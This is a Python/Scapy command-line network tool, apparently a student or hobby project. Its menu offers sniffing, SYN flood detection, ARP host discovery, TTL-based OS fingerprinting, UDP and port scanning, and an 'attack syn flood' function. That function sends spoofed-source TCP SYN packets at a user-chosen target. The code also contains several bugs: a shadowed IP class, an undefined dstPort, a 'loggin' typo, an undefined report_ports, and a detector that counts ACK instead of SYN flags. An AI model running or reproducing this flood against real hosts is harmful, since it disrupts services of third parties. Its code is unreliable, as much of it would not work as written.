import os
from scapy.all import *
from collections import Counter
import time
import logging
import matplotlib
import csv

logging.basicConfig(filename='info_network.log', level=logging.INFO,
	 format='%(levelname)s:%(message)s')


def print_output(sezion_name,response):
	print( "----------"+ sezion_name +"-----------------")

	print(response)

	print( "-----------------------------------------------")

# sniff all trafic in the network
def sniff_interface(interface,count=20):
	
	print( "-----Sniff packet in the NetworkInterface-------")

	protocol = ["","tcp", "udp","icmp"]	



	for i in range(0,len( interface)):
	
		print(str(i) + "." +  interface[i])
	
	choose = (int(input("choose the network interface:	\n")))
	

	print("choose the protocol: \n 0. all protocol \n 1. tcp \n 2. udp \n 3. icmp\n")

	choose_protocol = (int(input("")))
	

	if  choose_protocol  == 0:
	
		result = sniff(iface = interface[choose],count = count)
	
	else:
	
		result = sniff(iface = interface[choose],filter = protocol[choose_protocol],
	
			count=count)
	

	print(result.show())
	

	logging.info('\n')
	logging.info(time.ctime(time.time()))

	logging.info(result)
	
	for row in result:
	
		logging.info(row.sprintf('{IP:%IP.src%}{IPv4:%IPv4.src%}	-> {IP:%IP.dst%}{IPv4:%IPv4.dst%}'))
	
	
	more_information = input("visual more information on packet: (y/n) ")

	if more_information == "y":
	
		for row in result:
			
			
			logging.info(row)
	
	print( "-----------------------------------------------\n")


def randomIP():

	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))

	return ip

def randInt():

	x = random.randint(1000,9000)

	return x	

def attack_syn_flood(IP,number):

	for x in range (0,number):
	
		s_port = randInt()
	
		s_eq = randInt()
	
		w_indow = randInt()

		ans,unans = srloop(IP(src = randomIP(),dst=IP)/
			TCP(sport=s_port ,dport=dstPort,seq = s_eq, window = w_indow, flags="S"),
			count=number)

	return ans
	

def os_fingerprinting_load():
	
	results = []
	
	with open("os ttl.csv") as csvfile:
	
		reader = csv.reader(csvfile)
	
		for row in reader: # each row is a list
	
			if 'ICMP' in row[2]:
	
				results.append((row[0] + row[1],int(row[3])))
	
	return results		

def os_fingerprinting(ttl,db_os_fingerprinting):
	
	for row in db_os_fingerprinting:
		
		if row[1] == ttl:

			return 'The Operative System is: '+row[0]


def send_ICMP(ip):

	ans = sr1(IP(dst=ip)/ICMP()/"XXXXXXXXXXX")

	return ans.ttl



# function that return mac adress through ip adress
def get_mac(ip): 
	
	arp_request = ARP(pdst = ip)

	broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff")

	arp_request_broadcast = broadcast / arp_request

	answered_list = srp(arp_request_broadcast, timeout = 5, verbose = False)[0]

	return answered_list[0][1].hwsrc


# find host in the netwok
def scan_host_network():

	output =''

	ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.178.0/24"),
		timeout=2)

	for row in ans : 
	
	 	output += str(row) 

	return output ,ans

def scan_udp(host):
	
	ans, unans = sr(IP(dst = host)/UDP(dport = [(1, 65535)]), inter = 0.5, retry = 10, 
		timeout=1)
	
	ans.nsummary()


def scan_port_host(ip_host,first_port,ultime_port):

	return report_ports(ip_host,(first_port,ultime_port))
	
	
def dection_syn_flood():

	count = Counter()

	pkts = sniff(filter = 'tcp', count = 50)
	
	for pkt in  pkts:
		
		if TCP in pkt and pkt[TCP].flags == 'A':  # TCP SYN packet
	
			src = pkt.sprintf('{IP:%IP.src%}{IPv4:%IPv4.src%}')
	
			count[src] = count[src] + 1	

	return count



def main():

	interface = os.listdir('/sys/class/net/')

	db_os_fingerprinting=os_fingerprinting_load()

	menu ='''\nChoose what action to perform:
	1. Sniff interface
	2. Dection syn flood
	3. Attack syn flood
	4. Scan host network  
	5. Os_fingerprinting 
	6. Scan port host\n''' 

	while(True):
		try :
			choose = int(input(menu))
		
			if(choose == 1):
		
				sniff_interface(interface)

			elif (choose == 2):

				output ='\n'

				logging.info('\n')

				logging.info('Dection syn-flood')
				
				logging.info(time.ctime(time.time()))

				count = dection_syn_flood()

				for item in count:

					output += str(item) +"	: "+str(count[item])+'\n'

				logging.info(output)

				print_output("dection syn-flood attack",output)

			elif (choose == 3):

				ip = input("ip target")	

				logging.info('\n')

				logging.info('attack syn flood')
				
				logging.info(time.ctime(time.time()))

				number = int(input('numbers of attacks'))

				loggin.info(attack_syn_flood(ip,number))

			elif (choose == 4):	
					
				output,ans = scan_host_network()

				logging.info('\n')

				logging.info('Scan host network')
				
				logging.info(time.ctime(time.time()))

				logging.info(str(output))

				print(ans.show())
		

			elif (choose == 5):
			
				ip = input("ip target")	

				logging.info('\n')

				logging.info('Os fingerprinting ICMP')
				
				logging.info(time.ctime(time.time()))

				count = dection_syn_flood()

				output = os_fingerprinting(send_ICMP(ip),db_os_fingerprinting)
				
				logging.info(output)
				
				print(output)
			
			elif (choose == 6):

				ip = input("ip target")	

				port1 = str(int(input("first port")))

				port2 = str(int(input("second port")))
			
				print(scan_port_host(ip,port1,port2))

			elif (choose == 7):
			
				ip = input("ip target")	

				print(get_mac(ip))
			
		except KeyboardInterrupt:

			print('You pressed Ctrl+C!')

			sys.exit(0)

if __name__ == "__main__":

	main()